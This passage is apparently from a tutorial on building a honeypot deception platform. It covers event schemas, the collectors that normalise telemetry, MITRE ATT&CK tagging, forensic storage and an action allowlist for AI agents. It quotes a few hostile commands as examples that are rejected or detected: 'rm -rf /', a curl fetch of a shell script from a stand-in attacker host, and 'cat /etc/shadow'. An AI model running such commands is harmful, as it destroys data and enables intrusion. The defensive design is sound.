    company: str

    # Regular method — needs an instance: obj.method()
    def get_display_name(self) -> str:
        return f"[{self.company}]"

    # classmethod — called on the class: ClassName.method()
    # 'cls' = the class itself (not an instance)
    @classmethod
    def from_orm_state(cls, orm_obj) -> "EnvironmentStateSchema":
        return cls(company=orm_obj.state.get("company"))
    # cls(...) calls __init__ on the class = creates a new instance

    # staticmethod — no self, no cls. Just a plain function in the class namespace.
    @staticmethod
    def is_valid_mode(mode: str) -> bool:
        return mode in {"baseline", "passive", "active"}
```

## `JSONB` and Why We Use It

JSONB in PostgreSQL lets you store arbitrary JSON and query inside it:
```sql
SELECT state->'company'           -- extract a value
FROM environment_state
WHERE state->>'deception_mode' = 'baseline'   -- query inside JSON
AND state @> '{"active_decoys": 10}'          -- contains operator
```

We use it for `state`, `metadata`, `raw_data`, `normalized_data` because these fields have different shapes for different event types. You can't model "arbitrary attacker-specific metadata" with fixed columns.

---

# PART 13 — Design Decisions Explained

## Why Flask for the Web App but FastAPI for the API?

**Flask** is simpler, has a mature ecosystem for web apps (Jinja2 templating is Flask's native tool), and requires no async complexity for simple page serving. For the honeypot web app that just renders HTML templates, Flask is the right tool.

**FastAPI** is designed for APIs — automatic validation, automatic OpenAPI docs, async support, and type safety out of the box. For the internal API that the AI/ML team will integrate against, FastAPI's automatic documentation is invaluable.

## Why Separate File Server Instead of Building It into BHRAM API?

Single Responsibility Principle. The BHRAM API is for **reading environment state and telemetry**. File management is a different concern. By separating them:
- File server can be swapped/upgraded independently
- BHRAM API stays clean (no file I/O code)
- File server can have different security policies (later: rate limiting, auth)

## Why Not Expose the Database Port?

```yaml
# postgres service in compose.yaml
expose:
  - "5432"    # ← NOT "ports: 5432:5432"
```

`expose` = visible only to containers on the same Docker network.
`ports` = visible to the host machine (and potentially the network).

A common mistake is to add `ports: "5432:5432"` to make it easier to connect from the host. This bypasses all network isolation and exposes the database to anyone who can reach the host machine. We deliberately don't do this.

## Why `is_decoy: bool = True` on Every User?

This field seems redundant — if all users are decoys, why store it? It's for Part 2: if you ever add a real monitoring user (e.g., a read-only user for the AI/ML agent) you can set `is_decoy=False` and all queries can easily distinguish. The default protects you from accidentally creating real users without marking them.

---

# PART 14 — Building Part 2: The Philosophy of Telemetry Normalization

## The Problem Part 2 Solves

In Part 1, we built the honeypots: Cowrie listening for SSH connections, a Flask web application presenting corporate pages, and a decoy file server storing honeytoken documents.

Each of these systems writes logs in a completely different language:
- **Cowrie** outputs complex, deeply nested JSON blobs (`eventid: "cowrie.command.input"`, `eventid: "cowrie.login.success"`).
- **Flask web application** produces Apache-style HTTP access logs or JSON request records (`method: "POST"`, `url: "/login"`).
- **File server** records file access audit events (`action: "read"`, `filename: "salary_structure.csv"`).
- **Network layer** records packet headers, TCP connection states, and DNS queries.

If you feed these raw, disparate logs directly to an AI/ML agent or a database query engine, the AI agent has to know the idiosyncrasies of every log format in existence. Furthermore, if you change honeypots tomorrow (say, swapping Cowrie for Dionaea or Conpot), all your downstream analytics and AI agents would break.

**Part 2 solves this by creating the Canonical Telemetry Normalization Layer.**

```
Raw Sources (Cowrie, Flask, File Server, Network)
                     │
                     ▼
             Telemetry Collectors
  (Parse raw formats into intermediary objects)
                     │
                     ▼
              Event Normalizer
  (Deduplication, MITRE ATT&CK TTP tagging, Severity escalation)
                     │
                     ▼
            Canonical BHRAM Event
  (One single schema for all cybersecurity events)
        ┌────────────┴────────────┐
        ▼                         ▼
PostgreSQL & AI API        Forensic Storage
(Fast queries, AI models)  (Immutable append-only JSONL files)
```

---

# PART 15 — The Canonical Event Schema (`bhram/telemetry/schemas`)

## Why Pydantic v2?

We model the canonical event schema using Pydantic v2 `BaseModel`. Pydantic gives us:
1. **Strict Type Safety**: If an IP address, timestamp, or port is malformed, it gets caught immediately at ingestion time.
2. **Fast Serialization**: Pydantic's Rust core parses and serializes tens of thousands of events per second with virtually zero overhead.
3. **Automatic Normalization**: We can compute severities and validate event taxonomies declaratively using `@field_validator` and `@model_validator`.

## The Schema Structure

A single `CanonicalEvent` is composed of four logical sub-objects:

```python
class CanonicalEvent(BaseModel):
    event_id: uuid.UUID          # Unique UUID for this occurrence
    timestamp: datetime          # ISO-8601 UTC timestamp
    session_id: Optional[str]    # Correlated session ID
    source_ip: Optional[str]     # Attacker IP address
    source_port: Optional[int]   # Attacker client port
    destination_host: Optional[str]
    destination_port: Optional[int]

    # Structured sub-objects
    source: EventSource          # { component, version, host }
    event: EventDetail           # { type, category, action, outcome }
    actor: ActorInfo             # { username, session_id, user_agent }
    target: TargetInfo           # { host, port, service, path, filename }

    severity: str                # 'info', 'low', 'medium', 'high', 'critical'
    metadata: Dict[str, Any]     # Source-specific details, TTPs, bait levels
    raw_data: Optional[Dict]     # Immutable original raw log line
```

### Event Taxonomy
Instead of hundreds of arbitrary strings, all events are normalized into an established 14-item taxonomy:
- `authentication`: Login attempts, successes, failures.
- `command`: Shell commands executed in the honeypot.
- `network_connection`: TCP/UDP connection observed.
- `port_scan`: Network port scanning.
- `file_access`, `file_create`, `file_modify`, `file_delete`: File activities.
- `web_request`: HTTP decoy interactions.
- `credential_attempt`: Web or API credential probing.
- `honeypot_detection_attempt`: Attacker probing for honeypot artifacts (`/.env`, `/robots.txt`).
- `session_start`, `session_end`: Session boundary lifecycle events.

---

# PART 16 — Building the Telemetry Collectors (`bhram/telemetry/collectors`)

Collectors are responsible for reading raw logs and translating them into `CanonicalEvent` objects.

## 1. Cowrie Collector (`cowrie.py`)
Cowrie produces structured JSON with an `eventid` key:
- `cowrie.session.connect` → `session_start` event.
- `cowrie.login.failed` → `authentication` event with outcome `failure`.
- `cowrie.login.success` → `authentication` event with outcome `success` and severity `critical` (an attacker gained a shell!).
- `cowrie.command.input` → `command` event. We inspect the command string against known recon and exploitation tools (`whoami`, `cat /etc/shadow`, `wget`) and map it to MITRE ATT&CK TTPs.
- `cowrie.session.file_upload` → `file_create` event.
- `cowrie.session.closed` → `session_end` event.

**Crucial Design Rule**: The raw event dict is copied untouched into `raw_data`. Forensic evidence must never be lost or modified.

## 2. Web Collector (`web.py`)
The Flask decoy logs all incoming HTTP requests. The web collector examines:
- **Paths**: Requests to sensitive paths like `/.env`, `/.git`, or `/admin` are marked as `honeypot_detection_attempt` with `high` severity.
- **Methods**: POST requests to `/login` are marked as `credential_attempt`.
- **User Agents**: Tools like `sqlmap`, `nikto`, `curl`, and `nmap` are captured in `actor.user_agent`.

## 3. File Server Collector (`fileserver.py`)
When a file is requested from the decoy file server:
- The collector retrieves the file's `bait_level` (1 to 5).
- Access to high-bait honeytokens (e.g. `salary_structure.csv` or `database_backup.sql` with `bait_level=5`) automatically assigns `critical` severity.

## 4. Network Telemetry Adapter (`network.py`)
Captures lower-level network activity:
- Multi-port SYN scans are parsed into `port_scan` events tagged with `T1046 - Network Service Scanning`.
- TCP handshakes are parsed into `network_connection` events.
- DNS lookups for internal hostnames (`intranet.bhram-technologies.internal`) are tracked.

---

# PART 17 — The Normalizer & Session State Engine (`bhram/telemetry/normalizer`)

The `EventNormalizer` sits between the raw collectors and the storage pipeline. It does three vital jobs:

## 1. Sliding-Window Deduplication
Attackers often run brute-force scripts or automated scanners that generate thousands of identical requests per second. Storing 10,000 identical `login.failed` events exhausts disk and swamps AI models.
- The normalizer computes a signature: `(source_ip, event_type, action)`.
- If an identical event arrives within the deduplication window (e.g., 5 seconds), the duplicate is dropped while incrementing the session event count.

## 2. MITRE ATT&CK TTP Tagging
The normalizer tags events with standardized MITRE ATT&CK tactics and techniques:
- `whoami`, `id` → `T1033 - System Owner Discovery`
- `ifconfig`, `ip addr` → `T1016 - System Network Configuration Discovery`
- `ps aux`, `top` → `T1057 - Process Discovery`
- `cat /etc/shadow`, `cat /etc/passwd` → `T1003 - OS Credential Dumping`
- Port scanning → `T1046 - Network Service Scanning`
- Web brute forcing → `T1110 - Brute Force`
- Data exfiltration → `T1041 - Exfiltration Over C2 Channel`

## 3. Dynamic Severity Escalation
Attacker threat level is not static:
- An attacker executing 1 command is curious (`medium`).
- An attacker executing >5 commands is actively exploring (`high`).
- An attacker executing credential dumping or accessing high-bait files is a critical threat (`critical`).
The session state engine tracks active session statistics in memory and escalates severity dynamically.

---

# PART 18 — Forensic Storage Pipeline & Evidentiary Integrity (`bhram/telemetry/storage`)

When building a cyber deception platform, telemetry serves two masters:
1. **Real-time analytics & AI orchestration**: Needs fast relational queries, indexes, and JSON querying (PostgreSQL).
2. **Forensic & legal evidentiary integrity**: Needs an immutable, write-once, append-only flat file archive that can withstand database corruption or operational resets.

## Dual-Write Architecture

```
Normalizer
    │
    ├──▶ ForensicStorage (Flat files on disk)
    │      ├── data/raw/YYYY/MM/DD/{source}.jsonl       (Raw evidence)
    │      └── data/normalized/YYYY/MM/DD/events.jsonl (Canonical events)
    │
    └──▶ PostgreSQL Pipeline
           ├── raw_events   (raw_data + SHA-256 data_hash)
           ├── events       (normalized canonical data + JSONB)
           └── session_events (fast session ↔ event junction)
```

### Forensic Hash Verification
In `raw_events`, we compute `data_hash = hashlib.sha256(raw_json_bytes).hexdigest()`. If an investigator ever questions whether telemetry logs were altered after the fact, the cryptographic hash verifies absolute log integrity.

### The `session_events` Junction Table
Instead of doing expensive full-table scans across millions of events with `WHERE session_id = ...`, the junction table `session_events(session_id, event_id, event_time)` allows instant timeline reconstruction and pagination.

---

# PART 19 — The AI/ML API & Security Allowlist Guardrails (`bhram-api`)

The BHRAM API exposes dedicated endpoints for external AI/ML agents to consume telemetry and submit strategic deception responses:

## 1. `GET /api/v1/ai/events`
Fetches a chronological batch of unanalyzed events (`analyzed == False`, default batch size: 50). Ordered oldest-first so the AI agent reconstructs the attacker's trajectory step-by-step.

## 2. `POST /api/v1/ai/profile`
Once the AI agent evaluates the events, it submits an attacker profile:
```json
{
  "source_ip": "10.10.10.50",
  "session_id": "demo-session-uuid",
  "skill_level": "intermediate",
  "suspected_intent": "credential_harvesting",
  "observed_ttps": ["T1046", "T1003", "T1083"],
  "suspicion_score": 0.85,
  "behavior_summary": "Attacker performed recon and attempted shadow file access"
}
```
This updates the `attacker_profiles` table and links the session.

## 3. `POST /api/v1/ai/decision` — The Strict Allowlist Security Boundary

> ⚠️ **CRITICAL SECURITY PRINCIPLE**: An AI/ML agent must NEVER have direct access to execute arbitrary shell commands or system calls on the host or inside containers.

The API strictly validates every requested action against `AI_ACTION_ALLOWLIST`:
```python
AI_ACTION_ALLOWLIST = {
    "add_decoy_file",
    "modify_decoy_content",
    "delay_response",
    "simulate_service_crash",
    "escalate_privilege_fake",
    "inject_fake_process",
    "isolate_session",
    "log_forensic_snapshot",
    "change_deception_mode",
    "alert_operator",
}
```

If an AI agent (or a compromised agent subjected to prompt injection) submits an unauthorized action (e.g. `rm -rf /` or `curl attacker.com/shell.sh`), the endpoint immediately rejects it with **HTTP 422 Unprocessable Entity**.

Furthermore, in Part 2, decisions are recorded in `deception_actions` for auditability; execution of approved actions is handled by the deterministic orchestrator in Part 3.

---

# PART 20 — What You Need to Know for Part 3

Now that Part 1 (Honeypot Infrastructure) and Part 2 (Telemetry & Normalization Pipeline) are complete, the foundation is completely ready for **Part 3: Reactive-Adaptive Multi-Agent Intelligence**:

1. **Multi-Agent Orchestration**:
   - *Behavioral Analysis Agent*: Consumes `/api/v1/ai/events` and classifies attacker activity.
   - *Threat Assessment Agent*: Computes dynamic threat scores.
   - *Deception Orchestration Agent*: Selects allowlisted actions from `AI_ACTION_ALLOWLIST`.
2. **Deception Execution Engine**:
   - Reads approved decisions from `deception_actions`.
   - Executes dynamic decoys via the fileserver API (`/files/create`) and Cowrie runtime configuration.
3. **Live Streaming**:
   - Real-time WebSocket event broadcaster for visualization dashboards.

---

# Summary — What You Now Know (Parts 1 & 2)

| Concept | Where Used | What It Does |
|---|---|---|
| Docker networks (`internal: true`) | compose.yaml | Physically isolates PostgreSQL from attacker networks |
| PostgreSQL ENUMs | schema.sql | Type-safe constrained database values |
| Pydantic v2 CanonicalEvent | telemetry/schemas | Unified schema for all cybersecurity events |
| Cowrie Collector | telemetry/collectors/cowrie.py | Ingests SSH honeypot JSON streams |
| Web Collector | telemetry/collectors/web.py | Ingests Flask decoy access logs and credential attempts |
| File Collector | telemetry/collectors/fileserver.py | Captures file access events with honeytoken bait levels |
| Network Adapter | telemetry/collectors/network.py | Normalizes SYN scans, TCP connections, and DNS queries |
| Event Normalizer | telemetry/normalizer/normalizer.py | Deduplication, dynamic severity escalation, TTP tagging |
| MITRE ATT&CK Mapping | normalizer & collectors | Standardized threat taxonomy (T1046, T1003, T1083, etc.) |
| Dual-Write Storage | telemetry/storage/pipeline.py | Forensic JSONL flat files + PostgreSQL tables |
| SHA-256 Hash Verification | database/schema.sql (raw_events) | Evidentiary chain-of-custody verification |
| Session Junction Table | schema.sql (session_events) | Fast O(1) timeline queries without full table scans |
| AI Event Batching | routes/ai.py (`/ai/events`) | Chronological unanalyzed events for AI processing |
| Attacker Profiling | routes/ai.py (`/ai/profile`) | Correlates skill, intent, and threat score to sessions |
| AI Action Allowlist | routes/ai.py (`/ai/decision`) | Strict security boundary preventing arbitrary execution |
| Forensic Flat Files | data/raw/, data/normalized/ | Immutable append-only disk logs partitioned by date |
| Demo Event Generator | scripts/demo_generate_events.py | Safe end-to-end synthetic attack simulation |

You now have a complete, production-grade understanding of both the deception infrastructure and the telemetry normalization layer.
